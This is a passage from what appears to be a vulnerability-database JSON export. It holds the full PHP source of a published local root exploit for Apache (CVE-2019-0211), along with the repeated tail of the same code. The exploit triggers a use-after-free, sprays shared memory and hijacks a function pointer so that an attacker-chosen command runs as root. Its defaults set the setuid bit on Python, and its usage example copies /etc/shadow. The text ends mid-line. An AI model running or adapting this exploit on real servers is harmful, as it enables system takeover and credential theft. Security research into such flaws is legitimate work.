0x' . dechex($properties_address));\r\n\t\to('  From: 0x' . dechex($spray_min));\r\n\t\to('  To: 0x' . dechex($spray_max));\r\n\t\to('  Size: 0x' . dechex($spray_size));\r\n\t\to('  Covered: 0x' . dechex($spray_size * count($workers_pids)));\r\n\t\to('  Apache: 0x' . dechex(\r\n\t\t\t$addresses['apache'][1] -\r\n\t\t\t$addresses['apache'][0]\r\n\t\t));\r\n\r\n\t\t$s_properties_address = ptr2str($properties_address);\r\n\r\n\t\tfor(\r\n\t\t\t$i = $spray_min;\r\n\t\t\t$i < $spray_max;\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$i - $address] = $s_properties_address[$i % 8];\r\n\t\t}\r\n\t\to('');\r\n\r\n\t\t# Find workers PID in the SHM: it indicates the beginning of their\r\n\t\t# process_score structure. We can then change process_score.bucket to\r\n\t\t# the index we computed. When apache reboots, it will use\r\n\t\t# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex\r\n\t\t# which means we control the whole apr_proc_mutex_t structure.\r\n\t\t# This structure contains pointers to multiple functions, especially\r\n\t\t# mutex->meth->child_init(), which will be called before privileges\r\n\t\t# are dropped.\r\n\t\t# We do this for every worker PID, incrementing the bucket index so that\r\n\t\t# we cover a bigger range.\r\n\t\t\r\n\t\to('Iterating in SHM to find PIDs...');\r\n\r\n\t\t# Number of bucket indexes covered by our spray\r\n\t\t$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);\r\n\t\t# Number of bucket indexes covered by our spray and the PS structures\r\n\t\t$total_nb_buckets = $spray_nb_buckets * count($workers_pids);\r\n\t\t# First bucket index to handle\r\n\t\t$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);\r\n\r\n\t\t# Iterate over every process_score structure until we find every PID or\r\n\t\t# we reach the end of the SHM\r\n\t\tfor(\r\n\t\t\t$p = $addresses['shm'][0] + 0x20;\r\n\t\t\t$p < $addresses['shm'][1] && count($workers_pids) > 0;\r\n\t\t\t$p += 0x24\r\n\t\t)\r\n\t\t{\r\n\t\t\t$l = $p - $address;\r\n\t\t\t$current_pid = str2ptr($this->abc, $l, 4);\r\n\t\t\to('Got PID: ' . $current_pid);\r\n\t\t\t# The PID matches one of the workers\r\n\t\t\tif(in_array($current_pid, $workers_pids))\r\n\t\t\t{\r\n\t\t\t\tunset($workers_pids[$current_pid]);\r\n\t\t\t\to('  PID matches');\r\n\t\t\t\t# Update bucket address\r\n\t\t\t\t$s_bucket_index = pack('l', $bucket_index);\r\n\t\t\t\t$this->abc[$l + 0x20] = $s_bucket_index[0];\r\n\t\t\t\t$this->abc[$l + 0x21] = $s_bucket_index[1];\r\n\t\t\t\t$this->abc[$l + 0x22] = $s_bucket_index[2];\r\n\t\t\t\t$this->abc[$l + 0x23] = $s_bucket_index[3];\r\n\t\t\t\to('  Changed bucket value to ' . $bucket_index);\r\n\t\t\t\t$min = $spray_min - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\t$max = $spray_max - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\to('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));\r\n\t\t\t\t# This bucket range is covered, go to the next one\r\n\t\t\t\t$bucket_index += $spray_nb_buckets;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(count($workers_pids) > 0)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Unable to find PIDs ' .\r\n\t\t\t\timplode(', ', $workers_pids) .\r\n\t\t\t\t' in SHM, exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\t\to('EXPLOIT SUCCESSFUL.');\r\n\t\to('Await 6:25AM.');\r\n\t\t\r\n\t\treturn 0;\r\n\t}\r\n}\r\n\r\nfunction o($msg)\r\n{\r\n\t# No concatenation -> no string allocation\r\n\tprint($msg);\r\n\tprint(\"\\n\");\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$s-1;$j>=0;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$p+$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\nfunction in($i, $range)\r\n{\r\n\treturn $i >= $range[0] && $i < $range[1];\r\n}\r\n\r\n/**\r\n * Finds the offset of a symbol in a file.\r\n */\r\nfunction find_symbol($file, $symbol)\r\n{\r\n    $elf = file_get_contents($file);\r\n    $e_shoff = str2ptr($elf, 0x28);\r\n    $e_shentsize = str2ptr($elf, 0x3a, 2);\r\n    $e_shnum = str2ptr($elf, 0x3c, 2);\r\n\r\n    $dynsym_off = 0;\r\n    $dynsym_sz = 0;\r\n    $dynstr_off = 0;\r\n\r\n    for($i=0;$i<$e_shnum;$i++)\r\n    {\r\n        $offset = $e_shoff + $i * $e_shentsize;\r\n        $sh_type = str2ptr($elf, $offset + 0x04, 4);\r\n\r\n        $SHT_DYNSYM = 11;\r\n        $SHT_SYMTAB = 2;\r\n        $SHT_STRTAB = 3;\r\n\r\n        switch($sh_type)\r\n        {\r\n            case $SHT_DYNSYM:\r\n                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);\r\n                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);\r\n                break;\r\n            case $SHT_STRTAB:\r\n            case $SHT_SYMTAB:\r\n                if(!$dynstr_off)\r\n                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);\r\n                break;\r\n        }\r\n\r\n    }\r\n\r\n    if(!($dynsym_off && $dynsym_sz && $dynstr_off))\r\n        exit('.');\r\n\r\n    $sizeof_Elf64_Sym = 0x18;\r\n\r\n    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)\r\n    {\r\n        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;\r\n        $st_name = str2ptr($elf, $offset, 4);\r\n        \r\n        if(!$st_name)\r\n            continue;\r\n        \r\n        $offset_string = $dynstr_off + $st_name;\r\n        $end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;\r\n        $string = substr($elf, $offset_string, $end);\r\n\r\n        if($string == $symbol)\r\n        {\r\n            $st_value = str2ptr($elf, $offset + 0x8, 8);\r\n            return $st_value;\r\n        }\r\n    }\r\n\r\n    die('Unable to find symbol ' . $symbol);\r\n}\r\n\r\n# Obtains the addresses of the shared memory block and some functions through \r\n# /proc/self/maps\r\n# This is hacky as hell.\r\nfunction get_all_addresses()\r\n{\r\n\t$addresses = [];\r\n\t$data = file_get_contents('/proc/self/maps');\r\n\t$follows_shm = false;\r\n\r\n\tforeach(explode(\"\\n\", $data) as $line)\r\n\t{\r\n\t\tif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))\r\n\t\t{\r\n            $line = explode(' ', $line)[0];\r\n            $bounds = array_map('hexdec', explode('-', $line));\r\n            if ($bounds[1] - $bounds[0] == 0x14000)\r\n            {\r\n                $addresses['shm'] = $bounds;\r\n                $follows_shm = true;\r\n            }\r\n        }\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'system');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['system'] = $line + $offset;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprX'] = $bounds;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r--p')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprR'] = $bounds;\r\n\t\t}\r\n\t\t# Apache's memory block is between the SHM and ld.so\r\n\t\t# Sometimes some rwx region gets mapped; all_buckets cannot be in there\r\n\t\t# but we include it anyways for the sake of simplicity\r\n\t\tif(\r\n\t\t\t(\r\n\t\t\t\tstrpos($line, 'rw-p') ||\r\n\t\t\t\tstrpos($line, 'rwxp')\r\n\t\t\t) &&\r\n            $follows_shm\r\n\t\t)\r\n\t\t{\r\n            if(strpos($line, '/lib'))\r\n            {\r\n                $follows_shm = false;\r\n                continue;\r\n            }\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\tif(!array_key_exists('apache', $addresses))\r\n\t\t\t    $addresses['apache'] = $bounds;\r\n\t\t\telse if($addresses['apache'][1] == $bounds[0])\r\n                $addresses['apache'][1] = $bounds[1];\r\n\t\t\telse\r\n                $follows_shm = false;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'zend_object_std_dtor');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['zend_object_std_dtor'] = $line + $offset;\r\n\t\t}\r\n\t}\r\n\r\n\t$expected = [\r\n\t\t'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'\r\n\t];\r\n\t$missing = array_diff($expected, array_keys($addresses));\r\n\r\n\tif($missing)\r\n\t{\r\n\t\to(\r\n\t\t\t'The following addresses were not determined by parsing ' .\r\n\t\t\t'/proc/self/maps: ' . implode(', ', $missing)\r\n\t\t);\r\n\t\texit(0);\r\n\t}\r\n\r\n\r\n\to('PID: ' . getmypid());\r\n\to('Fetching addresses');\r\n\r\n\tforeach($addresses as $k => $a)\r\n\t{\r\n\t\tif(!is_array($a))\r\n\t\t\t$a = [$a];\r\n\t\to('  ' . $k . ': ' . implode('-0x', array_map(function($z) {\r\n\t\t\t\treturn '0x' . dechex($z);\r\n\t\t}, $a)));\r\n\t}\r\n\to('');\r\n\r\n\treturn $addresses;\r\n}\r\n\r\n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,\r\n# matching the cmdline and the UID\r\nfunction get_workers_pids()\r\n{\r\n\to('Obtaining apache workers PIDs');\r\n\t$pids = [];\r\n\t$cmd = file_get_contents('/proc/self/cmdline');\r\n\t$processes = glob('/proc/*');\r\n\tforeach($processes as $process)\r\n\t{\r\n\t\tif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))\r\n\t\t\tcontinue;\r\n\t\t$pid = (int) $match[1];\r\n\t\tif(\r\n\t\t\t!is_readable($process . '/cmdline') ||\r\n\t\t\t!is_readable($process . '/status')\r\n\t\t)\r\n\t\t\tcontinue;\r\n\t\tif($cmd !== file_get_contents($process . '/cmdline'))\r\n\t\t\tcontinue;\r\n\r\n\t\t$status = file_get_contents($process . '/status');\r\n\t\tforeach(explode(\"\\n\", $status) as $line)\r\n\t\t{\r\n\t\t\tif(\r\n\t\t\t\tstrpos($line, 'Uid:') === 0 &&\r\n\t\t\t\tpreg_match('#\\b' . posix_getuid() . '\\b#', $line)\r\n\t\t\t)\r\n\t\t\t{\r\n\t\t\t\to('  Found apache worker: ' . $pid);\r\n\t\t\t\t$pids[$pid] = $pid;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\t\r\n\to('Got ' . sizeof($pids) . ' PIDs.');\r\n\to('');\r\n\r\n\treturn $pids;\r\n}\r\n\r\n$addresses = get_all_addresses();\r\n$workers_pids = get_workers_pids();\r\nreal();",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:46676"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category local exploits",
            "modified": "2019-04-08T00:00:00",
            "published": "2019-04-08T00:00:00",
            "id": "1337DAY-ID-32502",
            "href": "https://0day.today/exploit/description/32502",
            "title": "Apache 2.4.17 < 2.4.38 - apache2ctl graceful (logrotate) Local Privilege Escalation Exploit",
            "type": "zdt",
            "sourceData": "<?php\r\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\r\n# Charles Fol\r\n# @cfreal_\r\n#\r\n# INFOS\r\n#\r\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\r\n#\r\n# USAGE\r\n#\r\n# 1. Upload exploit to Apache HTTP server\r\n# 2. Send request to page\r\n# 3. Await 6:25AM for logrotate to restart Apache\r\n# 4. python3.5 is now suid 0\r\n#\r\n# You can change the command that is ran as root using the cmd HTTP\r\n# parameter (GET/POST).\r\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\r\n#\r\n# SUCCESS RATE\r\n#\r\n# Number of successful and failed exploitations relative to of the number\r\n# of MPM workers (i.e. Apache subprocesses). YMMV.\r\n#\r\n# W  --% S   F\r\n#  5 87% 177 26 (default)\r\n#  8 89%  60  8\r\n# 10 95%  70  4\r\n#\r\n# More workers, higher success rate.\r\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\r\n# Generally, failure is due to all_buckets being relocated too far from its\r\n# original address.\r\n#\r\n# TESTED ON\r\n#\r\n# - Apache/2.4.25\r\n# - PHP 7.2.12\r\n# - Debian GNU/Linux 9.6\r\n#\r\n# TESTING\r\n#\r\n# $ curl http://localhost/cfreal-carpediem.php\r\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\r\n# $ ls -alh /usr/bin/python3.5\r\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\r\n#\r\n# There are no hardcoded addresses.\r\n# - Addresses read through /proc/self/mem\r\n# - Offsets read through ELF parsing\r\n#\r\n# As usual, there are tons of comments.\r\n#\r\n\r\n\r\no('CARPE (DIEM) ~ CVE-2019-0211');\r\no('');\r\n\r\nerror_reporting(E_ALL);\r\n\r\n\r\n# Starts the exploit by triggering the UAF.\r\nfunction real()\r\n{\r\n\tglobal $y;\r\n\t$y = [new Z()];\r\n\tjson_encode([0 => &$y]);\r\n}\r\n\r\n# In order to read/write what comes after in memory, we need to UAF a string so\r\n# that we can control its size and make in-place edition.\r\n# An easy way to do that is to replace the string by a timelib_rel_time\r\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\r\n# properties of the DateInterval object.\r\n#\r\n# Steps:\r\n# - Create a base object (Z)\r\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\r\n# - Create DateInterval object ($place) meant to be unset and filled by another\r\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\r\n# - Unset $place: at this point, if we create a new DateInterval object, it will\r\n#   replace $place in memory\r\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\r\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\r\n#   end up in place of abc\r\n# - Now we can control $this->abc's zend_string structure entirely using\r\n#   y, m, d etc.\r\n# - Increase abc's size so that we can read/write memory that comes after it,\r\n#   especially the shared memory block\r\n# - Find out all_buckets' position by finding a memory region that matches the\r\n#   mutex->meth structure\r\n# - Compute the bucket index required to reach the SHM and get an arbitrary\r\n#   function call\r\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\r\n#   bucket\r\nclass Z implements JsonSerializable\r\n{\r\n\tpublic function jsonSerialize()\r\n\t{\r\n\t\tglobal $y, $addresses, $workers_pids;\r\n\r\n\t\t#\r\n\t\t# Setup memory\r\n\t\t#\r\n        o('Triggering UAF');\r\n\t\to('  Creating room and filling empty spaces');\r\n\r\n\t\t# Fill empty blocks to make sure our allocations will be contiguous\r\n\t\t# I: Since a lot of allocations/deallocations happen before the script\r\n\t\t# is ran, two variables instanciated at the same time might not be\r\n\t\t# contiguous: this can be a problem for a lot of reasons.\r\n\t\t# To avoid this, we instanciate several DateInterval objects. These\r\n\t\t# objects will fill a lot of potentially non-contiguous memory blocks,\r\n\t\t# ensuring we get \"fresh memory\" in upcoming allocations.\r\n\t\t$contiguous = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$contiguous[] = new DateInterval('PT1S');\r\n\r\n\t\t# Create some space for our UAF blocks not to get overwritten\r\n\t\t# I: A PHP object is a combination of a lot of structures, such as\r\n\t\t# zval, zend_object, zend_object_handlers, zend_string, etc., which are\r\n\t\t# all allocated, and freed when the object is destroyed.\r\n\t\t# After the UAF is triggered on the object, all the structures that are\r\n\t\t# used to represent it will be marked as free.\r\n\t\t# If we create other variables afterwards, those variables might be\r\n\t\t# allocated in the object's previous memory regions, which might pose\r\n\t\t# problems for the rest of the exploitation.\r\n\t\t# To avoid this, we allocate a lot of objects before the UAF, and free\r\n\t\t# them afterwards. Since PHP's heap is LIFO, when we create other vars,\r\n\t\t# they will take the place of those objects instead of the object we\r\n\t\t# are triggering the UAF on. This means our object is \"shielded\" and\r\n\t\t# we don't have to worry about breaking it.\r\n\t\t$room = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$room[] = new Z();\r\n\r\n\t\t# Build string meant to fill old DateInterval's timelib_rel_time\r\n\t\t# I: ptr2str's name is unintuitive here: we just want to allocate a\r\n\t\t# zend_string of size 78.\r\n\t\t$_protector = ptr2str(0, 78);\r\n\r\n\t\to('  Allocating $abc and $p');\r\n\r\n\t\t# Create ABC\r\n\t\t# I: This is the variable we will use to R/W memory afterwards.\r\n\t\t# After we free the Z object, we'll make sure abc is overwritten by a\r\n\t\t# timelib_rel_time structure under our control. The first 8*8 = 64 bytes\r\n\t\t# of this structure can be modified easily, meaning we can change the\r\n\t\t# size of abc. This will allow us to read/write memory after abc.\r\n\t\t$this->abc = ptr2str(0, 79);\r\n\r\n\t\t# Create $p meant to protect $this's blocks\r\n\t\t# I: Right after we trigger the UAF, we will unset $p.\r\n\t\t# This means that the timelib_rel_time structure (TRT) of this object\r\n\t\t# will be freed. We will then allocate a string ($protector) of the same\r\n\t\t# size as TRT. Since PHP's heap is LIFO, the string will take the place\r\n\t\t# of the now-freed TRT in memory.\r\n\t\t# Then, we create a new DateInterval object ($x). From the same\r\n\t\t# assumption, every structure constituting this new object will take the\r\n\t\t# place of the previous structure. Nevertheless, since TRT's memory\r\n\t\t# block has already been replaced by $protector, the new TRT will be put\r\n\t\t# in the next free blocks of the same size, which happens to be $abc\r\n\t\t# (remember, |abc| == |timelib_rel_time|).\r\n\t\t# We now have the following situation: $x is a DateInterval object whose\r\n\t\t# internal TRT structure has the same address as $abc's zend_string.\r\n\t\t$p = new DateInterval('PT1S');\r\n\r\n\t\t#\r\n\t\t# Trigger UAF\r\n\t\t#\r\n\t\t\r\n\t\to('  Unsetting both variables and setting $protector');\r\n\t\t# UAF here, $this is usable despite being freed\r\n\t\tunset($y[0]);\r\n\t\t# Protect $this's freed blocks\r\n\t\tunset($p);\r\n\r\n\t\t# Protect $p's timelib_rel_time structure\r\n\t\t$protector = \".$_protector\";\r\n\t\t# !!! This is only required for apache\r\n\t\t# Got no idea as to why there is an extra deallocation (?)\r\n\t\t$room[] = \"!$_protector\";\r\n\r\n\t\to('  Creating DateInterval object');\r\n\t\t# After this line:\r\n\t\t# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str\r\n\t\t# We can control the structure of $this->abc and therefore read/write\r\n\t\t# anything that comes after it in memory by changing its size and\r\n\t\t# making in-place edits using $this->abc[$position] = $char\r\n\t\t$x = new DateInterval('PT1S');\r\n\t\t# zend_string.refcount = 0\r\n\t\t# It will get incremented at some point, and if it is > 1,\r\n\t\t# zend_assign_to_string_offset() will try to duplicate it before making\r\n\t\t# the in-place replacement\r\n\t\t$x->y = 0x00;\r\n\t\t# zend_string.len\r\n\t\t$x->d = 0x100;\r\n\t\t# zend_string.val[0-4]\r\n\t\t$x->h = 0x13121110;\r\n\r\n\t\t# Verify UAF was successful\r\n\t\t# We modified stuff via $x; they should be visible by $this->abc, since\r\n\t\t# they are at the same memory location.\r\n\t\tif(!(\r\n\t\t\tstrlen($this->abc) === $x->d &&\r\n\t\t\t$this->abc[0] == \"\\x10\" &&\r\n\t\t\t$this->abc[1] == \"\\x11\" &&\r\n\t\t\t$this->abc[2] == \"\\x12\" &&\r\n\t\t\t$this->abc[3] == \"\\x13\"\r\n\t\t))\r\n\t\t{\r\n\t\t\to('UAF failed, exiting.');\r\n\t\t\texit();\r\n\t\t}\r\n\t\to('UAF successful.');\r\n\t\to('');\r\n\r\n\t\t# Give us some room\r\n\t\t# I: As indicated before, just unset a lot of stuff so that next allocs\r\n\t\t# don't break our fragile UAFd structure.\r\n\t\tunset($room);\r\n\r\n\t\t#\r\n\t\t# Setup the R/W primitive\r\n\t\t#\r\n\r\n\t\t# We control $abc's internal zend_string structure, therefore we can R/W\r\n\t\t# the shared memory block (SHM), but for that we need to know the\r\n\t\t# position of $abc in memory\r\n\t\t# I: We know the absolute position of the SHM, so we need to need abc's\r\n\t\t# as well, otherwise we cannot compute the offset\r\n\r\n\t\t# Assuming the allocation was contiguous, memory looks like this, with\r\n\t\t# 0x70-sized fastbins:\r\n\t\t# \t[zend_string:abc]\r\n\t\t# \t[zend_string:protector]\r\n\t\t# \t[FREE#1]\r\n\t\t# \t[FREE#2]\r\n\t\t# Therefore, the address of the 2nd free block is in the first 8 bytes\r\n\t\t# of the first block: 0x70 * 2 - 24\r\n\t\t$address = str2ptr($this->abc, 0x70 * 2 - 24);\r\n\t\t# The address we got points to FREE#2, hence we're |block| * 3 higher in\r\n\t\t# memory\r\n\t\t$address = $address - 0x70 * 3;\r\n\t\t# The beginning of the string is 24 bytes after its origin\r\n\t\t$address = $address + 24;\r\n\t\to('Address of $abc: 0x' . dechex($address));\r\n\t\to('');\r\n\r\n\t\t# Compute the size required for our string to include the whole SHM and\r\n\t\t# apache's memory region\r\n\t\t$distance = \r\n\t\t\tmax($addresses['apache'][1], $addresses['shm'][1]) -\r\n\t\t\t$address\r\n\t\t;\r\n\t\t$x->d = $distance;\r\n\r\n\t\t# We can now read/write in the whole SHM and apache's memory region.\r\n\r\n\t\t#\r\n\t\t# Find all_buckets in memory\r\n\t\t#\r\n\r\n\t\t# We are looking for a structure s.t.\r\n\t\t# |all_buckets, mutex| = 0x10\r\n\t\t# |mutex, meth| = 0x8\r\n\t\t# all_buckets is in apache's memory region\r\n\t\t# mutex is in apache's memory region\r\n\t\t# meth is in libaprR's memory region\r\n\t\t# meth's function pointers are in libaprX's memory region\r\n\t\to('Looking for all_buckets in memory');\r\n\t\t$all_buckets = 0;\r\n\r\n\t\tfor(\r\n\t\t\t$i = $addresses['apache'][0] + 0x10;\r\n\t\t\t$i < $addresses['apache'][1] - 0x08;\r\n\t\t\t$i += 8\r\n\t\t)\r\n\t\t{\r\n\t\t\t# mutex\r\n\t\t\t$mutex = $pointer = str2ptr($this->abc, $i - $address);\r\n\t\t\tif(!in($pointer, $addresses['apache']))\r\n\t\t\t\tcontinue;\r\n\r\n\r\n\t\t\t# meth\r\n\t\t\t$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);\r\n\t\t\tif(!in($pointer, $addresses['libaprR']))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\to('  [&mutex]: 0x' . dechex($i));\r\n\t\t\to('    [mutex]: 0x' . dechex($mutex));\r\n\t\t\to('      [meth]: 0x' . dechex($meth));\r\n\r\n\r\n\t\t\t# meth->*\r\n\t\t\t# flags\r\n\t\t\tif(str2ptr($this->abc, $pointer - $address) != 0)\r\n\t\t\t\tcontinue;\r\n\t\t\t# methods\r\n\t\t\tfor($j=0;$j<7;$j++)\r\n\t\t\t{\r\n\t\t\t\t$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);\r\n\t\t\t\tif(!in($m, $addresses['libaprX']))\r\n\t\t\t\t\tcontinue 2;\r\n\t\t\t\to('        [*]: 0x' . dechex($m));\r\n\t\t\t}\r\n\r\n\t\t\t$all_buckets = $i - 0x10;\r\n\t\t\to('all_buckets = 0x' . dechex($all_buckets));\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif(!$all_buckets)\r\n\t\t{\r\n\t\t\to('Unable to find all_buckets');\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\r\n\t\t# The address of all_buckets will change when apache is gracefully\r\n\t\t# restarted. This is a problem because we need to know all_buckets's\r\n\t\t# address in order to make all_buckets[some_index] point to a memory\r\n\t\t# region we control.\r\n\r\n\t\t#\r\n\t\t# Compute potential bucket indexes and their addresses\r\n\t\t#\r\n\r\n        o('Computing potential bucket indexes and addresses');\r\n\r\n\t\t# Since we have sizeof($workers_pid) MPM workers, we can fill the rest\r\n\t\t# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),\r\n\t\t# with data we like. We keep the one at the top to store our payload.\r\n\t\t# The rest is sprayed with the address of our payload.\r\n\r\n\t\t$size_prefork_child_bucket = 24;\r\n\t\t$size_worker_score = 264;\r\n\t\t# I get strange errors if I use every \"free\" item, so I leave twice as\r\n\t\t# many items free. I'm guessing upon startup some\r\n\t\t$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);\r\n\t\t$spray_max = $addresses['shm'][1];\r\n\t\t$spray_min = $spray_max - $spray_size;\r\n\r\n\t\t$spray_middle = (int) (($spray_min + $spray_max) / 2);\r\n\t\t$bucket_index_middle = (int) (\r\n\t\t\t- ($all_buckets - $spray_middle) /\r\n\t\t\t$size_prefork_child_bucket\r\n\t\t);\r\n\r\n\t\t#\r\n\t\t# Build payload\r\n\t\t#\r\n\r\n\t\t# A worker_score structure was kept empty to put our payload in\r\n\t\t$payload_start = $spray_min - $size_worker_score;\r\n\r\n\t\t$z = ptr2str(0);\r\n\r\n    \t# Payload maxsize 264 - 112 = 152\r\n\t\t# Offset 8 cannot be 0, but other than this you can type whatever\r\n\t\t# command you want\r\n    \t$bucket = isset($_REQUEST['cmd']) ?\r\n    \t\t$_REQUEST['cmd'] :\r\n    \t\t\"chmod +s /usr/bin/python3.5\";\r\n\r\n    \tif(strlen($bucket) > $size_worker_score - 112)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Payload size is bigger than available space (' .\r\n\t\t\t\t($size_worker_score - 112) .\r\n\t\t\t\t'), exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n    \t# Align\r\n    \t$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");\r\n\r\n    \t# apr_proc_mutex_unix_lock_methods_t\r\n\t\t$meth = \r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t\t# child_init\r\n\t\t    ptr2str($addresses['zend_object_std_dtor'])\r\n\t\t;\r\n\r\n\t\t# The second pointer points to meth, and is used before reaching the\r\n\t\t# arbitrary function call\r\n\t\t# The third one and the last one are both used by the function call\r\n\t\t# zend_object_std_dtor(object) => ... => system(&arData[0]->val)\r\n\t\t$properties = \r\n\t\t\t# refcount\r\n\t\t\tptr2str(1) .\r\n\t\t\t# u-nTableMask meth\r\n\t\t\tptr2str($payload_start + strlen($bucket)) .\r\n\t\t\t# Bucket arData\r\n\t\t\tptr2str($payload_start) .\r\n\t\t\t# uint32_t nNumUsed;\r\n\t\t\tptr2str(1, 4) .\r\n\t\t    # uint32_t nNumOfElements;\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nTableSize\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nInternalPointer\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# zend_long nNextFreeElement\r\n\t\t\t$z .\r\n\t\t\t# dtor_func_t pDestructor\r\n\t\t\tptr2str($addresses['system'])\r\n\t\t;\r\n\r\n\t\t$payload =\r\n\t\t\t$bucket .\r\n\t\t\t$meth .\r\n\t\t\t$properties\r\n\t\t;\r\n\r\n\t\t# Write the payload\r\n\r\n\t\to('Placing payload at address 0x' . dechex($payload_start));\r\n\r\n\t\t$p = $payload_start - $address;\r\n\t\tfor(\r\n\t\t\t$i = 0;\r\n\t\t\t$i < strlen($payload);\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$p+$i] = $payload[$i];\r\n\t\t}\r\n\r\n\t\t# Fill the spray area with a pointer to properties\r\n\t\t\r\n\t\t$properties_address = $payload_start + strlen($bucket) + strlen($meth);\r\n\t\to('Spraying pointer');\r\n\t\to('  Address: 0x' . dechex($properties_address));\r\n\t\to('  From: 0x' . dechex($spray_min));\r\n\t\to('  To: 0x' . dechex($spray_max));\r\n\t\to('  Size: 0x' . dechex($spray_size));\r\n\t\to('  Covered: 0x' . dechex($spray_size * count($workers_pids)));\r\n\t\to('  Apache: 0x' . dechex(\r\n\t\t\t$addresses['apache'][1] -\r\n\t\t\t$addresses['apache'][0]\r\n\t\t));\r\n\r\n\t\t$s_properties_address = ptr2str($properties_address);\r\n\r\n\t\tfor(\r\n\t\t\t$i = $spray_min;\r\n\t\t\t$i < $spray_max;\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$i - $address] = $s_properties_address[$i % 